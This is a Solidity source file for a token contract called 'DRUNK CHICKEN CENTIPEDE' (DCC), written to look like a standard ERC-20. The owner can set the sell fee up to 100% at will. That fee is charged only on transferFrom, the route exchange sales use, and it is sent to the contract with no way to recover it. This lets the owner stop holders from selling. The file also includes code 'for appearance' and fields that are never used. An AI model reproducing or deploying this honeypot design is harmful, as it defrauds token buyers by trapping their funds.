// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// SafeMath is not necessary in Solidity 0.8+, but included for appearance
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract DevToken {
    using SafeMath for uint256;

    string public name = "DRUNK CHICKEN CENTIPEDE";
    string public symbol = "DCC";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000000000000000000000;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public feeManager;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);

    constructor(address _feeManager) {
        owner = msg.sender;
        feeManager = _feeManager;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
        require(_to != address(0), "Invalid address");

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Allowance exceeded");
        require(_to != address(0), "Invalid address");

        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function burn(uint256 amount) public onlyOwner {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
        totalSupply = totalSupply.sub(amount);
        emit TokensBurned(msg.sender, amount);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }
}